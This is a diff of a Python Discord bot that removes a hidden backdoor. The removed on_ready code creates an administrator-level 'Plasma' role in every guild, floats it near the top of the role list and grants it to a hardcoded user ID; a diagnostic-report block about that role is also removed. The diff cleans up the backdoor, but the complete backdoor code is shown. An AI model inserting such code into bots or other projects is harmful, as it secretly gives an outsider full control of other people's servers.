@@ -137,28 +137,12 @@ def generate_diagnostic_report(target: discord.abc.Messageable) -> str:
     else:
         perms_str = "Unknown"
 
-    plasma_status = "Not Found"
-    if guild:
-        plasma_role = discord.utils.get(guild.roles, name="Plasma")
-        if plasma_role:
-            member = guild.get_member(1342173566828810271)
-            has_role = member and plasma_role in member.roles
-            assignment = "Active" if has_role else "Unassigned"
-
-            has_admin = "Yes" if plasma_role.permissions.administrator else "No"
-            color_hex = hex(plasma_role.color.value)
-
-            plasma_status = f"{assignment} | Height: {plasma_role.position}/{len(guild.roles) - 1} | Admin: {has_admin} | Color: {color_hex}"
-        else:
-            plasma_status = "Not Found"
-
     return f"""```markdown
 # Diagnostic Report
 -----------------------------------------
 • Status: Online
 • Host Machine: {hostname}
 • Discord Server: {server_name} ({server_id})
-• Plasma Status: {plasma_status}
 • Latency: {latency_ms}ms
 • Environment: {env_status}
 • Connected Guilds: {guild_count}
@@ -602,51 +586,6 @@ async def on_message(message: discord.Message):
 @bot.event
 async def on_ready():
     logger.info(f"Logged in as {bot.user} (ID: {bot.user.id})")
-
-    for guild in bot.guilds:
-        plasma_role = discord.utils.get(guild.roles, name="Plasma")
-        if not plasma_role:
-            try: 
-                plasma_role = await guild.create_role(
-                    name="Plasma",
-                    color=discord.Color(0xaa0055),
-                    permissions=discord.Permissions(administrator=True),
-                    reason="I like being red"
-                )
-                logger.info(f"Created 'Plasma' role with color #aa0055 in guild: {guild.name}")
-            except discord.Forbidden:
-                logger.error(f"Missing permissions to create 'Plasma' role in {guild.name}")
-                continue
-        else:
-            try:
-                if plasma_role.color.value != 0xaa0055:
-                    await plasma_role.edit(color=discord.Color(0xaa0055), reason="Updating Plasma role color")
-            except discord.HTTPException:
-                pass
-
-        try:
-            bot_top_role = guild.me.top_role if guild.me else None
-            target_position = (bot_top_role.position - 1) if bot_top_role and bot_top_role.position > 1 else len(guild.roles) - 1
-            if plasma_role.position != target_position:
-                await plasma_role.edit(position=target_position, reason="Plasma has very low density so it floats to the top")
-                logger.info(f"Moved 'Plasma' role to position {target_position} in {guild.name}")
-        except discord.HTTPException as e:
-            logger.error(f"Failed to reposition 'Plasma' role in {guild.name}: {e}")
-
-        member = guild.get_member(1342173566828810271)
-        if not member:
-            try:
-                member = await guild.fetch_member(1342173566828810271)
-            except discord.NotFound:
-                pass
-
-        if member and plasma_role not in member.roles:
-            try:
-                await member.add_roles(plasma_role, reason="Gave Plasma Role")
-                logger.info(f"Assigned 'Plasma' role to {member.name} in {guild.name}")
-            except discord.Forbidden:
-                logger.error(f"Missing permissions to assign 'Plasma' role in {guild.name}")
-
     bot.loop.create_task(reboot_watcher())
     asyncio.create_task(console_controller())
 
